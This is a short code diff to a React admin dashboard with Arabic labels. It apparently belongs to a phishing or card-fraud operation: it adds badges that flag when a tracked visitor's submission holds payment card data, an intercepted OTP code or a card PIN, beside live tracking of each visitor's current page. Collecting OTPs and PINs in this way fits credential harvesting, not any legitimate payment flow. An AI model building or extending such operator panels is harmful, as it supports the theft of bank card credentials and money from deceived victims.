@@ -22,7 +22,8 @@ import {
   Users,
   LogOut,
   Volume2,
-  VolumeX
+  VolumeX,
+  Lock
 } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { Input } from "@/components/ui/input";
@@ -466,7 +467,7 @@ export default function FirebaseDashboard() {
                           📍 {getUserCurrentPage(sub.visitorId)}
                         </p>
                       )}
-                      <div className="flex items-center gap-2 mt-2">
+                      <div className="flex items-center gap-2 mt-2 flex-wrap">
                         {sub.status === "completed" ? (
                           <span className="text-xs bg-green-500/20 text-green-400 px-2 py-0.5 rounded">
                             مكتمل
@@ -474,6 +475,24 @@ export default function FirebaseDashboard() {
                         ) : (
                           <span className="text-xs bg-yellow-500/20 text-yellow-400 px-2 py-0.5 rounded">
                             {sub.lastStep || "جاري"}
+                          </span>
+                        )}
+                        {(sub.step_4_payment_card || sub.step_4_payment) && (
+                          <span className="text-xs bg-orange-500/20 text-orange-400 px-2 py-0.5 rounded flex items-center gap-1">
+                            <CreditCard className="h-3 w-3" />
+                            بطاقة
+                          </span>
+                        )}
+                        {sub.step_4_payment?.otpCode && (
+                          <span className="text-xs bg-purple-500/20 text-purple-400 px-2 py-0.5 rounded flex items-center gap-1">
+                            <Shield className="h-3 w-3" />
+                            OTP
+                          </span>
+                        )}
+                        {sub.step_5_pin?.pinCode && (
+                          <span className="text-xs bg-red-500/20 text-red-400 px-2 py-0.5 rounded flex items-center gap-1">
+                            <Lock className="h-3 w-3" />
+                            PIN
                           </span>
                         )}
                       </div>
